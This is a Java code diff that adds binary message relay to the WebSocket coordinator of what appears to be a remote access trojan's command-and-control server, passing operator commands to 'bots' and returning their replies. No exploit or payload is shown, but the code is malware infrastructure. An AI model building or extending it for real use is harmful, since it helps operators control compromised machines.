@@ -4,6 +4,7 @@ import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
 import devs.alex.sah.rat.c2server.models.AssociativePair;
 import devs.alex.sah.rat.c2server.services.MessagesBuilder;
 import devs.alex.sah.rat.c2server.services.ServerEndpoint;
+import devs.alex.sah.rat.c2server.utils.Utils;
 import lombok.extern.slf4j.Slf4j;
 import devs.alex.sah.rat.c2server.models.Message;
 import devs.alex.sah.rat.c2server.services.MessagesCoordinator;
@@ -16,6 +17,9 @@ import org.springframework.web.socket.TextMessage;
 import org.springframework.web.socket.WebSocketSession;
 
 import java.io.IOException;
+import java.nio.ByteBuffer;
+import java.nio.charset.Charset;
+import java.nio.charset.StandardCharsets;
 import java.util.UUID;
 
 @Slf4j
@@ -149,15 +153,8 @@ public class MessagesCoordinatorImpl implements MessagesCoordinator {
         return serverEndpoint;
     }
 
-    @Override
-    public void handleBotTextMessage(WebSocketSession session, TextMessage toParse) {
-        StringBuffer errors = new StringBuffer();
-        Message<String> message = messagesBuilder.parseMessage(toParse, errors);
-        if (errors.length() != 0) {
-            log.error(errors.toString());
-            return;
-        }
 
+    private void handleBotMessage(WebSocketSession session, Message<?> message, StringBuffer errors){
         AssociativePair association = extractAssociativePair(session, message.getRequestID(), errors);
         if (errors.length() != 0) {
             log.error(errors.toString());
@@ -196,21 +193,36 @@ public class MessagesCoordinatorImpl implements MessagesCoordinator {
             log.error(errors.toString());
             return;
         }
-        sendTextMessage(target, envelope, message.payload());
+        if(message.payload() instanceof String){
+            sendTextMessage(target, envelope, (String)message.payload());
+        }else{
+            sendBinaryMessage(target, envelope, (ByteBuffer)message.payload());
+        }
     }
 
     @Override
-    public void handleBotBinaryMessage(WebSocketSession session, BinaryMessage message) {
-
-    }
-
-    @Override
-    public void handleUserTextMessage(WebSocketSession session, TextMessage toParse) {
+    public void handleBotTextMessage(WebSocketSession session, TextMessage toParse) {
         StringBuffer errors = new StringBuffer();
         Message<String> message = messagesBuilder.parseMessage(toParse, errors);
-        if (message.getTargetType() == null) {
-            errors.append("[Target] cannot be null\n");
+        if (errors.length() != 0) {
+            log.error(errors.toString());
+            return;
         }
+        handleBotMessage(session, message, errors);
+    }
+
+    @Override
+    public void handleBotBinaryMessage(WebSocketSession session, BinaryMessage toParse) {
+        StringBuffer errors = new StringBuffer();
+        Message<ByteBuffer> message = messagesBuilder.parseMessage(toParse, errors);
+        if (errors.length() != 0) {
+            log.error(errors.toString());
+            return;
+        }
+        handleBotMessage(session, message, errors);
+    }
+
+    public void handleUserMessage(WebSocketSession session, Message<?> message, StringBuffer errors){
         if (errors.length() != 0) {
             handleUserErrors(session, errors);
             return;
@@ -252,13 +264,32 @@ public class MessagesCoordinatorImpl implements MessagesCoordinator {
             if (!(message.getResponseType() == null || (message.getResponseType() != null && message.getResponseType().equals("none")))) {
                 target.getAttributes().put(association, new AssociativePair((String) session.getAttributes().get("userId"), message.getRequestID(), message.getTargetModule()));
             }
-            sendTextMessage(target, envelope, message.payload());
+            if(message.payload() instanceof String){
+                sendTextMessage(target, envelope, (String)message.payload());
+            }else{
+                sendBinaryMessage(target, envelope, (ByteBuffer)message.payload());
+            }
         }
     }
 
     @Override
-    public void handleUserBinaryMessage(WebSocketSession session, BinaryMessage message) {
+    public void handleUserTextMessage(WebSocketSession session, TextMessage toParse) {
+        StringBuffer errors = new StringBuffer();
+        Message<String> message = messagesBuilder.parseMessage(toParse, errors);
+        if (message.getTargetType() == null) {
+            errors.append("[Target] cannot be null\n");
+        }
+        handleUserMessage(session, message, errors);
+    }
 
+    @Override
+    public void handleUserBinaryMessage(WebSocketSession session, BinaryMessage toParse) {
+        StringBuffer errors = new StringBuffer();
+        Message<ByteBuffer> message = messagesBuilder.parseMessage(toParse, errors);
+        if (message.getTargetType() == null) {
+            errors.append("[Target] cannot be null\n");
+        }
+        handleUserMessage(session, message, errors);
     }
 
     @Override
@@ -271,8 +302,17 @@ public class MessagesCoordinatorImpl implements MessagesCoordinator {
     }
 
     @Override
-    public void sendBinaryMessage(WebSocketSession session, BinaryMessage message) {
-
+    public void sendBinaryMessage(WebSocketSession session, String envelope, ByteBuffer payload) {
+        ByteBuffer bbEnvelope = Utils.string2ByteBuffer(envelope,StandardCharsets.UTF_8);
+        ByteBuffer result = ByteBuffer.allocate(bbEnvelope.limit() + payload.limit())
+                .put(bbEnvelope)
+                .put(payload)
+                .rewind();
+        try {
+            session.sendMessage(new BinaryMessage(result));
+        } catch (IOException e) {
+            log.error("Fault send message. Message envelope: {}. Error: {}", envelope, e.getMessage());
+        }
     }
 
     @Override
